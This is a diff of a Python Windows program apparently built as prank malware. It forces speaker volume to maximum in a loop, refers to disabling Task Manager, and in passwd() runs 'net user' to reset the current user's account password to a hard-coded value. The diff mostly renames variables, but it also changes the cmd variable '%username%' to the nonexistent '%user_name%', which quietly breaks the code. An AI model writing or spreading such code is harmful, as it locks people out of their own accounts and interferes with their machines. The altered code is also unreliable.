@@ -14,7 +14,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 def set_audio(volume):
     devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL, None)
+    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
     # 设置音量（0.0到1.0之间的浮点数）
     volume_interface.SetMasterVolumeLevelScalar(volume, None)
@@ -41,7 +41,6 @@ class MainWindow(QMainWindow):
 
 
 def ts():
-
     while True:
         set_audio(1.0)
 
@@ -53,16 +52,16 @@ def disable_task_manage(num):
 
 
 def passwd():
-    os.system('echo %username% > a')
+    os.system('echo %user_name% > a')
 
     file = open('./a', 'r', encoding='utf-8')
-    userName = file.readlines()
-    print(userName, type(userName))
-    userName = userName[0].split()[0]
+    user_name = file.readlines()
+    print(user_name, type(user_name))
+    user_name = user_name[0].split()[0]
 
-    print(userName)
+    print(user_name)
 
-    os.system(f'net user {userName} 1145141919810')
+    os.system(f'net user {user_name} 1145141919810')
 
 
 if __name__ == '__main__':
